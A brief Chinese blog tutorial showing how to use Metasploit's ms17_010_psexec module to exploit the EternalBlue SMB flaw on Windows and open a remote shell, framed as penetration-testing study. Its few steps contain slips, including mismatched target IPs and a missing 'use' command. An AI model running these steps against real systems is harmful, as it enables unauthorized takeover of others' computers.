---
title: 【笔记】攻击具有 永恒之蓝 漏洞的Windows
date: 2019-11-16 17:14:28
tags:
---

## 前言

永恒之蓝（英语：EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄漏。该工具利用445/TCP端口的档案分享协议的漏洞进行散播。[维基百科](https://wikipedia.hk.wjbk.site/zh-hans/永恒之蓝)

<!-- more -->

## 声明

<font color="#FF0000">本文章仅用于网络安全渗透测试学习，请勿用于其他用途</font>

## 准备工作

- 安装并配置好的 Metasploit Framework （[传送门](https://feiju12138.github.io/2019/11/16/安装配置Metasploit-Framework)）

- 一台有"永恒之蓝"漏洞的Windows电脑

## 开始攻击

- 由于本文为测试，所以默认已知被攻击的电脑ip为"192.169.1.1"

- 启动 Metasploit Framework

``` bash
msfconsole
```

![01.png](/images/20191116171428/01.png)

- 查看攻击永恒之蓝漏洞的工具

``` bash
search ms17_010
```

- 使用其中一款工具，输入"y"确认

``` bash
exploit/windows/smb/ms17_010_psexec
```

![02.png](/images/20191116171428/02.png)

- 设置目标ip

``` bash
set RHOST 192.168.1.1
```

- 开始攻击

``` bash
exploit
```

- 如果攻击成功，即可获得控制权

## 取得Shell

- 取得shell后，即可在目标电脑执行命令行操作

``` bash
shell
```

## 完成

## 参考文献

[知乎——周毅刚](https://zhuanlan.zhihu.com/p/35793142)

